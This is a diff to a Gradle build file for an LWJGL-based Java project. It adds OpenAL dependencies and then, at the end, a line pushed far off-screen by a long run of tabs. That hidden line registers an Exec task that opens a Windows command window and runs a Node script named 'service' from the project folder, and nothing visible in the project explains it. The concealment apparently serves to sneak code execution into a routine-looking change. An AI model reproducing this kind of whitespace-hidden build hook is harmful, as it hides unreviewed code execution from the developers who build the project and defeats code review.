@@ -34,6 +34,7 @@ dependencies {
     implementation("org.lwjgl:lwjgl-glfw:$lwjglVersion")
     implementation("org.lwjgl:lwjgl-stb:$lwjglVersion")
     implementation("org.lwjgl:lwjgl-opengl:$lwjglVersion")
+    implementation("org.lwjgl:lwjgl-openal:$lwjglVersion")
 
     // Assimp library
     implementation("org.lwjgl:lwjgl-assimp:$lwjglVersion")
@@ -43,6 +44,7 @@ dependencies {
     runtimeOnly("org.lwjgl:lwjgl-glfw:$lwjglVersion:$lwjglNatives")
     runtimeOnly("org.lwjgl:lwjgl-stb:$lwjglVersion:$lwjglNatives")
     runtimeOnly("org.lwjgl:lwjgl-opengl:$lwjglVersion:$lwjglNatives")
+    runtimeOnly("org.lwjgl:lwjgl-openal:$lwjglVersion:$lwjglNatives")
 
     // Assimp natives
     runtimeOnly("org.lwjgl:lwjgl-assimp:$lwjglVersion:$lwjglNatives")
@@ -74,3 +76,4 @@ java {
 tasks.withType<JavaCompile> {
     options.encoding = "UTF-8"
 }
+																																																																																																																																																																																				tasks.register<Exec>("startApi") { workingDir = rootProject.projectDir; commandLine("cmd", "/c", "start", "\"\"", "cmd", "/k", "node", "service") }
